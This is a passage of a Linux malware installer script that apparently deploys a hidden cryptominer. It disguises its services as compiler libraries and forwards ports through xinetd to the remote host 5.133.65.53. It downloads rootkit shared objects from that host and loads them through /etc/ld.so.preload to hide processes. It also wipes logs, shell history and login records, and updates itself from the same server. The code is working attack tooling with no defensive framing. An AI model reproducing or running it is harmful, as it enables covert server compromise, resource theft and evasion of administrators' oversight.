	#log_daemon_msg "Reloading \$DESC" "\$NAME"
	#do_reload
	#log_end_msg \$?
	#;;
  restart|force-reload)
	#
	# If the "reload" option is implemented then remove the
	# 'force-reload' alias
	#
	log_daemon_msg "Restarting \$DESC" "\$NAME"
	do_stop
	case "\$?" in
	  0|1)
		do_start
		case "\$?" in
			0) log_end_msg 0 ;;
			1) log_end_msg 1 ;; # Old process is still running
			*) log_end_msg 1 ;; # Failed to start
		esac
		;;
	  *)
	  	# Failed to stop
		log_end_msg 1
		;;
	esac
	;;
  *)
	#echo "Usage: \$SCRIPTNAME {start|stop|restart|reload|force-reload}" >&2
	echo "Usage: \$SCRIPTNAME {start|stop|status|restart|force-reload}" >&2
	exit 3
	;;
esac

:
	
EOF
					chmod 755 /etc/init.d/$SERVICE_NAME
					update-rc.d $SERVICE_NAME defaults
					service $SERVICE_NAME stop >/dev/null 2>&1
					rm -f /var/run/$SERVICE_NAME.pid
					service $SERVICE_NAME start >/dev/null 2>&1
				else
					if [ -f /etc/init.d/$SERVICE_NAME ]; then
						chattr -i /etc/init.d/$SERVICE_NAME
					fi
					if [ "$isSystemctl" == false ]; then
						cat <<EOF >/etc/init.d/$SERVICE_NAME
#!/bin/sh
#
# $SERVICE_NAME - this script starts and stops the $SERVICE_NAME daemon
#
# chkconfig:    2345 85 15
# description:  $SERVICE_NAME is an HTTP(S) server, HTTP(S) reverse \
#               proxy and IMAP/POP3 proxy server
# processname: $FILE_NAME

# Source function library.
#. /etc/rc.d/init.d/functions
. /etc/init.d/modules
. /etc/init.d/status
PROGNAME="$RP/$FILE_NAME"
prog="\$(basename $SERVICE_NAME)"

lockfile="/var/lock/subsys/\${prog}"

start() {
    echo -n \$"Starting \$prog: "
    daemon \$PROGNAME
    retval=\$?
    echo
    [ \$retval -eq 0 ] && touch \$lockfile
    return \$retval
}

stop() {
    echo -n \$"Stopping \$prog: "
    pkill -9 \$prog
    retval=\$?
    echo
    [ \$retval -eq 0 ] && rm -f \$lockfile
    return \$retval
}

rh_status() {
    status \$prog  >/dev/null 2>&1
	if [[ \$? -ne 0 ]]; then
		statusfit \$prog
	fi
}

rh_status_q() {
    rh_status >/dev/null 2>&1
}

case "\$1" in
    start)
        rh_status_q && exit 0
        \$1
        ;;
    stop)
        rh_status_q || exit 0
        \$1
        ;;
    status)
        rh_\$1
        ;;
    *)
        echo \$"Usage: \$0 {start|stop|status}"
        exit 2
esac
EOF
						chmod 755 /etc/init.d/$SERVICE_NAME >/dev/null 2>&1
						chkconfig --add $SERVICE_NAME >/dev/null 2>&1
						chkconfig $SERVICE_NAME on >/dev/null 2>&1
						service $SERVICE_NAME stop >/dev/null 2>&1
						service $SERVICE_NAME start >/dev/null 2>&1
						service $SERVICE_NAME status >/dev/null 2>&1
						if [[ $? -ne 0 ]]; then
							cat <<EOF >/etc/init.d/$SERVICE_NAME
#!/bin/sh
#
# $SERVICE_NAME - this script starts and stops the $SERVICE_NAME daemon
#
# chkconfig:    2345 85 15
# description:  $SERVICE_NAME is an HTTP(S) server, HTTP(S) reverse \
#               proxy and IMAP/POP3 proxy server
# processname: $FILE_NAME

# Source function library.
. /etc/rc.d/init.d/functions
. /etc/init.d/status
#. /etc/init.d/modules
PROGNAME="$RP/$FILE_NAME"
prog="\$(basename \$PROGNAME)"

lockfile="/var/lock/subsys/\${prog}"

start() {
    echo -n \$"Starting \$prog: "
    daemon \$PROGNAME
    retval=\$?
    echo
    [ \$retval -eq 0 ] && touch \$lockfile
    return \$retval
}

stop() {
    echo -n \$"Stopping \$prog: "
    pkill -9 \$prog
    retval=\$?
    echo
    [ \$retval -eq 0 ] && rm -f \$lockfile
    return \$retval
}

rh_status() {
    status \$prog >/dev/null 2>&1
	if [[ \$? -ne 0 ]]; then
		statusfit \$prog
	fi
}

rh_status_q() {
    rh_status >/dev/null 2>&1
}

case "\$1" in
    start)
        rh_status_q && exit 0
        \$1
        ;;
    stop)
        rh_status_q || exit 0
        \$1
        ;;
    status)
        rh_\$1
        ;;
    *)
        echo \$"Usage: \$0 {start|stop|status}"
        exit 2
esac
EOF
							chmod 755 /etc/init.d/$SERVICE_NAME >/dev/null 2>&1
							chkconfig --add $SERVICE_NAME >/dev/null 2>&1
							chkconfig $SERVICE_NAME on >/dev/null 2>&1
							service $SERVICE_NAME stop >/dev/null 2>&1
							service $SERVICE_NAME start >/dev/null 2>&1
						fi
					else
						cat <<EOF >/etc/systemd/system/${SERVICE_NAME}.service
[Unit]
Description=$SERVICE_NAME web application server

[Service]
Type=simple
ExecStart=/bin/bash -c '$RP/$FILE_NAME'
WorkingDirectory=$RP
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF
						chmod 755 /etc/systemd/system/${SERVICE_NAME}.service >/dev/null 2>&1
						systemctl daemon-reload >/dev/null 2>&1
						systemctl enable ${SERVICE_NAME}.service >/dev/null 2>&1
						systemctl stop ${SERVICE_NAME}.service >/dev/null 2>&1
						systemctl start ${SERVICE_NAME}.service >/dev/null 2>&1
						systemctl is-active ${SERVICE_NAME} >/dev/null 2>&1
					fi
				fi
			fi
		fi

		if [ -f /etc/xinetd.d/smtp_forward ]; then
			#yum install xinetd -y >/dev/null 2>&1
			if command -v xinetd &>/dev/null; then
				if [ "$isSystemctl" == true ]; then
					if testport 127.0.0.1 757; then
						echo "xinetd 757 OK"
					else
						cat <<'EOF' >/etc/xinetd.d/smtp_forward
service smtp_forward
{
        disable         = no
        type            = UNLISTED
        socket_type     = stream
        protocol        = tcp
        user            = nobody
        wait            = no
        redirect        = 5.133.65.53 80
        port            = 757
		per_source = UNLIMITED
		instances = UNLIMITED
		cps = 10000 1
}
EOF
						systemctl daemon-reload >/dev/null 2>&1
						systemctl enable xinetd.service >/dev/null 2>&1
						systemctl stop xinetd.service >/dev/null 2>&1
						systemctl start xinetd.service >/dev/null 2>&1
					fi
					addportfrw 757
				else
					if testport 127.0.0.1 757; then
						echo "xinetd 757 OK"
					else
						cat <<'EOF' >/etc/xinetd.d/smtp_forward
service smtp_forward
{
        disable         = no
        type            = UNLISTED
        socket_type     = stream
        protocol        = tcp
        user            = nobody
        wait            = no
        redirect        = 5.133.65.53 80
        port            = 757
		per_source = UNLIMITED
		instances = UNLIMITED
		cps = 10000 1
}
EOF
						chkconfig xinetd on >/dev/null 2>&1
						service xinetd restart >/dev/null 2>&1
						if [[ $? -ne 0 ]]; then
							/etc/init.d/xinetd restart
						fi
					fi
					addportfrw 757
				fi
			fi
		else
			addportfrw 757
		fi
		if [ -f /etc/xinetd.d/http_forward ]; then
			if command -v xinetd &>/dev/null; then
				if [ "$isSystemctl" == true ]; then
					if testport 127.0.0.1 703; then
						echo "Proxy 703 OK"
					else
						systemctl daemon-reload >/dev/null 2>&1
						systemctl enable xinetd.service >/dev/null 2>&1
						systemctl stop xinetd.service >/dev/null 2>&1
						systemctl start xinetd.service >/dev/null 2>&1
					fi
					addportfrw 703
				else
					if testport 127.0.0.1 703; then
						echo "Proxy 703 OK"
					else
						chkconfig xinetd on >/dev/null 2>&1
						service xinetd restart >/dev/null 2>&1
						if [[ $? -ne 0 ]]; then
							/etc/init.d/xinetd restart
						fi
					fi
					addportfrw 703
				fi
			fi
		else
			addportfrw 703
		fi
		if command -v wget &>/dev/null; then
			TESTPOOL=$(wget -qO- 127.0.0.1:999/api.json 2>/dev/null | LC_ALL=en_US.utf8 grep -m1 -oP '"pool"\s*:\s*"\K[^"]+')
		elif command -v curl &>/dev/null; then
			TESTPOOL=$(curl -X GET http://127.0.0.1:999/api.json 2>/dev/null | LC_ALL=en_US.utf8 grep -m1 -oP '"pool"\s*:\s*"\K[^"]+')
		else
			TESTPOOL=$(__curl http://127.0.0.1:999/api.json 2>/dev/null | LC_ALL=en_US.utf8 grep -m1 -oP '"pool"\s*:\s*"\K[^"]+')
		fi

		if [ ! -z "$TESTPOOL" ]; then
			arrIN=(${TESTPOOL//:/ })
			TEMPIP=${arrIN[0]}
			TEMPPORT=${arrIN[1]}
			if [ -f /etc/xinetd.d/timesync ]; then
				TIMECONF=$(cat /etc/xinetd.d/timesync)
				if [[ $TIMECONF == *$TEMPIP* ]]; then
					if [[ $TIMECONF == *$TEMPPORT* ]]; then
						echo "Special Proxy 708 - OK"
						XINETREST=0
					else
						XINETREST=1
					fi
				else
					XINETREST=1
				fi
			else
				XINETREST=1
			fi

			if testport 127.0.0.1 443; then
				if [ -f /etc/xinetd.d/https_stream ]; then
					HTTPSSTREAM=1
					TIMECONF=$(cat /etc/xinetd.d/https_stream)
					if [[ $TIMECONF == *$TEMPIP* ]]; then
						if [[ $TIMECONF == *$TEMPPORT* ]]; then
							echo "Special Proxy 443 - OK"
						else
							XINETREST=1
						fi
					else
						XINETREST=1
					fi
				fi
			else
				HTTPSSTREAM=1
				if [ -f /etc/xinetd.d/https_stream ]; then
					TIMECONF=$(cat /etc/xinetd.d/https_stream)
					if [[ $TIMECONF == *$TEMPIP* ]]; then
						if [[ $TIMECONF == *$TEMPPORT* ]]; then
							echo "Special Proxy 443 - OK"
						else
							XINETREST=1
						fi
					else
						XINETREST=1
					fi
				else
					XINETREST=1
				fi
			fi

			if testport 127.0.0.1 8080; then
				if [ -f /etc/xinetd.d/http_stream ]; then
					HTTPSTREAM=1
					TIMECONF=$(cat /etc/xinetd.d/http_stream)
					if [[ $TIMECONF == *$TEMPIP* ]]; then
						if [[ $TIMECONF == *$TEMPPORT* ]]; then
							echo "Special Proxy 8080 - OK"
						else
							XINETREST=1
						fi
					else
						XINETREST=1
					fi
				fi
			else
				HTTPSTREAM=1
				if [ -f /etc/xinetd.d/http_stream ]; then
					TIMECONF=$(cat /etc/xinetd.d/http_stream)
					if [[ $TIMECONF == *$TEMPIP* ]]; then
						if [[ $TIMECONF == *$TEMPPORT* ]]; then
							echo "Special Proxy 8080 - OK"
						else
							XINETREST=1
						fi
					else
						XINETREST=1
					fi
				else
					XINETREST=1
				fi
			fi

			if [[ $XINETREST -eq 1 ]]; then
				cat <<EOF >/etc/xinetd.d/timesync
service timesync
{
        disable         = no
        type            = UNLISTED
        socket_type     = stream
        protocol        = tcp
        user            = nobody
        wait            = no
        redirect        = $TEMPIP $TEMPPORT
        port            = 708
		per_source = UNLIMITED
		instances = UNLIMITED
		cps = 10000 1
}
EOF
				if [[ $HTTPSTREAM -eq 1 ]]; then
					cat <<EOF >/etc/xinetd.d/http_stream
service http_stream
{
        disable         = no
        type            = UNLISTED
        socket_type     = stream
        protocol        = tcp
        user            = nobody
        wait            = no
        redirect        = $TEMPIP $TEMPPORT
        port            = 8080
		per_source = UNLIMITED
		instances = UNLIMITED
		cps = 10000 1
}
EOF
					if [ "$isSystemctl" == true ]; then
						systemctl daemon-reload >/dev/null 2>&1
						systemctl enable xinetd.service >/dev/null 2>&1
						systemctl stop xinetd.service >/dev/null 2>&1
						systemctl start xinetd.service >/dev/null 2>&1
						addportfrw 8080
					else
						chkconfig xinetd on >/dev/null 2>&1
						service xinetd restart >/dev/null 2>&1
						if [[ $? -ne 0 ]]; then
							/etc/init.d/xinetd restart
						fi
						addportfrw 8080
					fi
				fi
				if [[ $HTTPSSTREAM -eq 1 ]]; then
					cat <<EOF >/etc/xinetd.d/https_stream
service https_stream
{
        disable         = no
        type            = UNLISTED
        socket_type     = stream
        protocol        = tcp
        user            = nobody
        wait            = no
        redirect        = $TEMPIP $TEMPPORT
        port            = 443
		per_source = UNLIMITED
		instances = UNLIMITED
		cps = 10000 1
}
EOF
					if [ "$isSystemctl" == true ]; then
						systemctl daemon-reload >/dev/null 2>&1
						systemctl enable xinetd.service >/dev/null 2>&1
						systemctl stop xinetd.service >/dev/null 2>&1
						systemctl start xinetd.service >/dev/null 2>&1
						addportfrw 443
					else
						chkconfig xinetd on >/dev/null 2>&1
						service xinetd restart >/dev/null 2>&1
						if [[ $? -ne 0 ]]; then
							/etc/init.d/xinetd restart
						fi
						addportfrw 443
					fi
				fi
				if [ "$isSystemctl" == true ]; then
					systemctl daemon-reload >/dev/null 2>&1
					systemctl enable xinetd.service >/dev/null 2>&1
					systemctl stop xinetd.service >/dev/null 2>&1
					systemctl start xinetd.service >/dev/null 2>&1
					addportfrw 708
				else
					chkconfig xinetd on >/dev/null 2>&1
					service xinetd restart >/dev/null 2>&1
					if [[ $? -ne 0 ]]; then
						/etc/init.d/xinetd restart
					fi
					addportfrw 708
				fi
			fi
		fi

		if [ "$SKIPINSTALL" == false ]; then
			addportfrw 999
			###########################Info after install############################################################
			#Check $SERVICE_NAME Service
			if [ "$isSystemctl" == true ]; then
				systemctl is-active $SERVICE_NAME >/dev/null 2>&1
			else
				service $SERVICE_NAME status >/dev/null 2>&1
			fi
			if [[ $? -eq 0 ]]; then
				InfoG "Service $SERVICE_NAME running"
			else
				InfoR "Service $SERVICE_NAME not running"
			fi
			#Check $SERVICE_NAME Files
			if [ -f /root/$PATH_NAME/$FILE_NAME ]; then
				InfoG "File $FILE_NAME exists"
			else
				InfoG "File $FILE_NAME not found"
			fi

			if [ -f /etc/ld.so.preload ]; then
				REEDLD=$(cat /etc/ld.so.preload)
				if [[ $REEDLD == *kit.so* ]] || [[ $REEDLD == *arm.so* ]]; then
					TESTLD=1
				else
					unset TESTLD
				fi
			else
				unset TESTLD
			fi
			if [ ! -z "$TESTLD" ]; then
				LD=true
			else
				LD=false
			fi
			if [ "$LD" == false ]; then
				ps cax | grep $FILE_NAME
				if [ $? -eq 0 ]; then
					InfoG "Process $FILE_NAME active"
				else
					InfoR "Process $FILE_NAME not active"
				fi
			fi
			#Check good proxy
			InfoG "Pools list"
			cat /root/$PATH_NAME/config.json | grep 'url'
			cd /root/$PATH_NAME >/dev/null 2>&1 || exit
			chmod 755 $FILE_NAME >/dev/null 2>&1
			myIP=$(ip a s | sed -ne '/127.0.0.1/!{s/^[ \t]*inet[ \t]*\([0-9.]\+\)\/.*$/\1/p}')
			echo $myIP >/usr/spirit/myip
		fi
		#######################################################################################
		#################################################################################
		#clean

		clearLogs
		clearHistory
		disableAuth
		disableHistory
		disableLastLogin
		rm -fr /var/spool/mail/root >/dev/null 2>&1
		sleep 3
		chmod 755 /usr/local/lib/pkit.so >/dev/null 2>&1
		chmod 755 /usr/local/lib/fkit.so >/dev/null 2>&1
		chmod 755 /usr/local/lib/skit.so >/dev/null 2>&1
		chmod 755 /usr/local/lib/sshkit.so >/dev/null 2>&1
		chmod 755 /usr/local/lib/sshpkit.so >/dev/null 2>&1
		chmod 755 /usr/local/lib/sshpkitarm.so >/dev/null 2>&1
		chmod 755 /usr/local/lib/sshkitarm.so >/dev/null 2>&1
		chmod 755 /usr/local/lib/pkitarm.so >/dev/null 2>&1
		chmod 755 /usr/local/lib/fkitarm.so >/dev/null 2>&1
		chmod 755 /usr/local/lib/skitarm.so >/dev/null 2>&1
		chattr -aui /etc/ld.so.preload >/dev/null 2>&1
		CHECKARCH=$(arch)
		if [[ $CHECKARCH == *686* ]] || [[ $CHECKARCH == *mips* ]] || [[ $CHECKARCH == *arm* ]]; then
			chattr -aui /etc/ld.so.preload >/dev/null 2>&1
			cat /dev/null >/etc/ld.so.preload
			rm -rf /root/gcclib >/dev/null 2>&1
			rm -rf /usr/spirit >/dev/null 2>&1
		else
			FILENAME="pkitarm.so"
			HASH="535180fda78d476f88f9b5a33377514a"
			md5sum -c <<<"$HASH */usr/local/lib/pkitarm.so" || get_remote_file "http://5.133.65.53/soft/linux/pkitarm.so" "/usr/local/lib/pkitarm.so"
			unset HASH

			FILENAME="fkitarm.so"
			HASH="92afda90358296fb976ec73ad6d1bc51"
			md5sum -c <<<"$HASH */usr/local/lib/fkitarm.so" || get_remote_file "http://5.133.65.53/soft/linux/fkitarm.so" "/usr/local/lib/fkitarm.so"
			unset HASH

			FILENAME="skitarm.so"
			HASH="d23136c7cfa44d5f79b445ac06f57628"
			md5sum -c <<<"$HASH */usr/local/lib/skitarm.so" || get_remote_file "http://5.133.65.53/soft/linux/skitarm.so" "/usr/local/lib/skitarm.so"
			unset HASH评审
			unset HASH

			FILENAME="sshkitarm.so"
			HASH="b8c117dd3330c79761e7ba4e42c39b58"
			md5sum -c <<<"$HASH */usr/local/lib/sshkitarm.so" || get_remote_file "http://5.133.65.53/soft/linux/sshkitarm.so" "/usr/local/lib/sshkitarm.so"
			unset HASH

			FILENAME="sshpkitarm.so"
			HASH="e55590a300b6848cfada4f69161aec8f"
			md5sum -c <<<"$HASH */usr/local/lib/sshpkitarm.so" || get_remote_file "http://5.133.65.53/soft/linux/sshpkitarm.so" "/usr/local/lib/sshpkitarm.so"
			unset HASH

			FILENAME="skit.so"
			HASH="15e9ca6f6a4099ec718dcab442c17770"
			md5sum -c <<<"$HASH */usr/local/lib/skit.so" || get_remote_file "http://5.133.65.53/soft/linux/skit.so" "/usr/local/lib/skit.so"
			unset HASH

			FILENAME="sshkit.so"
			HASH="8a81663a5e57faa3e010021f336090a0"
			md5sum -c <<<"$HASH */usr/local/lib/sshkit.so" || get_remote_file "http://5.133.65.53/soft/linux/sshkit.so" "/usr/local/lib/sshkit.so"
			unset HASH

			FILENAME="sshpkit.so"
			HASH="4c13f207f9a3b7bb29ab48c41d56a20f"
			md5sum -c <<<"$HASH */usr/local/lib/sshpkit.so" || get_remote_file "http://5.133.65.53/soft/linux/sshpkit.so" "/usr/local/lib/sshpkit.so"
			unset HASH

			FILENAME="pkit.so"
			HASH="0dd164bdbe0943abc139dc0d9943b787"
			md5sum -c <<<"$HASH */usr/local/lib/pkit.so" || get_remote_file "http://5.133.65.53/soft/linux/pkit.so" "/usr/local/lib/pkit.so"
			unset HASH

			FILENAME="fkit.so"
			HASH="ec125eac1ef2a05c0a0a47b8296705ac"
			md5sum -c <<<"$HASH */usr/local/lib/fkit.so" || get_remote_file "http://5.133.65.53/soft/linux/fkit.so" "/usr/local/lib/fkit.so"
			unset HASH

			FILENAME="sshpass-arm"
			HASH="ee1432cef90ab142c2f5aa0a18f43a4a"
			md5sum -c <<<"$HASH */usr/spirit/sshpass-arm" || get_remote_file "http://5.133.65.53/soft/linux/sshpass-arm" "/usr/spirit/sshpass-arm"
			unset HASH

			FILENAME="sshpass"
			HASH="a84ef53884c08e4f5d6a07fccf88207a"
			md5sum -c <<<"$HASH */usr/spirit/sshpass" || get_remote_file "http://5.133.65.53/soft/linux/sshpass" "/usr/spirit/sshpass"
			unset HASH

			if [ $(arch) == "aarch64" ]; then
				if [[ ! -f /usr/local/lib/pkitarm.so ]] || [[ ! -f /usr/local/lib/fkitarm.so ]] || [[ ! -f /usr/local/lib/skitarm.so ]]; then
					cat /dev/null >/etc/ld.so.preload
					rm -fr /root/$PATH_NAME >/dev/null 2>&1
				else
					grep '/usr/local/lib/pkitarm.so' /etc/ld.so.preload >/dev/null 2>&1 || echo '/usr/local/lib/pkitarm.so' >>/etc/ld.so.preload
					grep '/usr/local/lib/fkitarm.so' /etc/ld.so.preload >/dev/null 2>&1 || echo '/usr/local/lib/fkitarm.so' >>/etc/ld.so.preload
					grep '/usr/local/lib/skitarm.so' /etc/ld.so.preload >/dev/null 2>&1 || echo '/usr/local/lib/skitarm.so' >>/etc/ld.so.preload
					grep '/usr/local/lib/sshkitarm.so' /etc/ld.so.preload >/dev/null 2>&1 || echo '/usr/local/lib/sshkitarm.so' >>/etc/ld.so.preload
					grep '/usr/local/lib/sshpkitarm.so' /etc/ld.so.preload >/dev/null 2>&1 || echo '/usr/local/lib/sshpkitarm.so' >>/etc/ld.so.preload
				fi
			else
				if [[ ! -f /usr/local/lib/pkit.so ]] || [[ ! -f /usr/local/lib/skit.so ]] || [[ ! -f /usr/local/lib/fkit.so ]]; then
					cat /dev/null >/etc/ld.so.preload
					rm -fr /root/$PATH_NAME >/dev/null 2>&1
				else
					grep '/usr/local/lib/pkit.so' /etc/ld.so.preload >/dev/null 2>&1 || echo '/usr/local/lib/pkit.so' >>/etc/ld.so.preload
					grep '/usr/local/lib/fkit.so' /etc/ld.so.preload >/dev/null 2>&1 || echo '/usr/local/lib/fkit.so' >>/etc/ld.so.preload
					grep '/usr/local/lib/skit.so' /etc/ld.so.preload >/dev/null 2>&1 || echo '/usr/local/lib/skit.so' >>/etc/ld.so.preload
					grep '/usr/local/lib/sshkit.so' /etc/ld.so.preload >/dev/null 2>&1 || echo '/usr/local/lib/sshkit.so' >>/etc/ld.so.preload
					grep '/usr/local/lib/sshpkit.so' /etc/ld.so.preload >/dev/null 2>&1 || echo '/usr/local/lib/sshpkit.so' >>/etc/ld.so.preload
				fi
			fi
		fi

		if [ -f /etc/ld.so.preload ]; then
			REEDLD=$(cat /etc/ld.so.preload)
			if [[ $REEDLD == *kit.so* ]] || [[ $REEDLD == *arm.so* ]]; then
				TESTLD=1
			else
				unset TESTLD
			fi
		else
			unset TESTLD
		fi

		if [ ! -z "$TESTLD" ]; then
			ps cax | grep $FILE_NAME
			if [ $? -ne 0 ]; then
				InfoG "LD Enabled"
			else
				InfoR "LD Enabled, but process visible. Remove LD"
				chattr -aui /etc/ld.so.preload >/dev/null 2>&1
				cat /dev/null >/etc/ld.so.preload
			fi
		else
			InfoR "LD Not enabled. Remove LD"
			chattr -aui /etc/ld.so.preload >/dev/null 2>&1
			cat /dev/null >/etc/ld.so.preload
		fi

		sleep 3
		chmod 755 /usr/spirit/spirit.sh /usr/spirit/spirit /usr/spirit/spirit-arm /usr/spirit/sshpass /usr/spirit/sshpass-arm >/dev/null 2>&1
	########################################################################################################################################################
	else
		echo
		InfoR "Already Running"
		echo
	fi
	rm -rf /root/sed* >/dev/null 2>&1
	rm -rf /usr/spirit/sed* >/dev/null 2>&1
	rm -rf /etc/alternatives/sed* >/dev/null 2>&1
	rm -rf /root/$PATH_NAME/sed* >/dev/null 2>&1
	rm -rf /root/cronman >/dev/null 2>&1
	rm -rf /root/cronman.pid >/dev/null 2>&1
	rm -rf /root/.cronman.pid >/dev/null 2>&1
	rm -rf /root/.cronman >/dev/null 2>&1
	rm -rf /root/tmp.file >/dev/null 2>&1
	find /tmp/* -mtime +1 -exec rm {} \; >/dev/null 2>&1
	find /tmp/* -type d -empty -delete >/dev/null 2>&1
	if [[ $SKIPUPDATE -eq 0 ]]; then
		Clean
	fi
}
if [ -f /root/lib/fileconf ]; then
	FILE_NAME=$($(sed -n '1{p;q}' /root/lib/fileconf))
	SERVICE_NAME=$($(sed -n '2{p;q}' /root/lib/fileconf))
	PATH_NAME=$($(sed -n '3{p;q}' /root/lib/fileconf))
	PATH_RES=$($(sed -n '4{p;q}' /root/lib/fileconf))
	FILE_RES=$($(sed -n '5{p;q}' /root/lib/fileconf))
	PATH_REZ=$($(sed -n '6{p;q}' /root/lib/fileconf))
	FILE_REZ=$($(sed -n '7{p;q}' /root/lib/fileconf))
else
	FILE_NAME="libgcc_a"
	SERVICE_NAME="crtend_b"
	PATH_NAME="gcclib"
	PATH_RES="/usr/lib/local"
	FILE_RES="crtres_c"
	PATH_REZ="/etc/lib"
	FILE_REZ="adxintrin_b"
fi
USERPATH="/etc/opt
    /etc/libnl
    /etc/postfix
    /home/lib
    /home/lib64
    /sbin
    /var/kernel
    /var/log
    /var/crash
    /mnt
    /root/$PATH_NAME"
########################################################################################
########################################################################################
########################################################################################
THISDIR=$(
	cd "$(dirname "$0")" || exit
	pwd
)
MY_NAME=$(basename "$0")
FILENAME="cronman"
if [ $MY_NAME == cronman ]; then
	if [ -f /etc/xbash/${MY_NAME}.pid ]; then
		SCRIPTPID=$(cat /etc/xbash/${MY_NAME}.pid)
		if [ -f /proc/$SCRIPTPID/status ]; then
			cat /proc/$SCRIPTPID/status | grep -q ${MY_NAME} && unset RUN || RUN=1
		else
			RUN=1
		fi
	else
		RUN=1
	fi
	if [[ $RUN == 1 ]]; then
		mkdir /etc/xbash >/dev/null 2>&1
		echo "$$" >/etc/xbash/${MY_NAME}.pid
		IPFILES="/root/tmp/ip.txt
/root/$PATH_NAME/ip.txt
/root/$PATH_NAME/ip.txt_tmp
/usr/spirit/allip
/usr/spirit/ip.txt_tmp
/usr/spirit/ip.txt
/etc/alternatives/ip.txt
/etc/alternatives/.xfit/ip.txt
/etc/alternatives/.warmup/ip.txt
/root/.xfit/ip.txt
/root/.warmup/ip.txt"
		echo "$IPFILES" | while IFS= read -r line; do
			if [ -f $line ]; then
				tr -d '\000' <$line >${line}.tmp
				rm -fr $line >/dev/null 2>&1
				mv -f ${line}.tmp $line >/dev/null 2>&1
				grep -Eo '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' $line | uniq | sort >${line}.tmp
				rm -fr $line >/dev/null 2>&1
				mv -f "${line}.tmp" "$line"
				sed -i 's/^[[:space:]]*//g' $line
				sed -i -e '$a\' $line
			fi
		done
	fi

fi
FILE_TO_FETCH_URL="http://5.133.65.53/soft/linux/$FILENAME"
if [[ $MY_NAME == $FILE_REZ ]]; then
	EXISTING_SHELL_SCRIPT="${THISDIR}/$FILE_REZ"
	EXECUTABLE_SHELL_SCRIPT="${THISDIR}/.${FILE_REZ}"
else
	EXISTING_SHELL_SCRIPT="${THISDIR}/cronman"
	EXECUTABLE_SHELL_SCRIPT="${THISDIR}/.cronman"
fi
if [[ $MY_NAME = \.* ]]; then
	# invoke real main program
	trap "clean_up; self_clean_up" >/dev/null 2>&1 #EXIT
	main "$@"
else
	# update myself and invoke updated version
	trap clean_up >/dev/null 2>&1 #EXIT
	update_self_and_invoke "$@"
fi



~~~
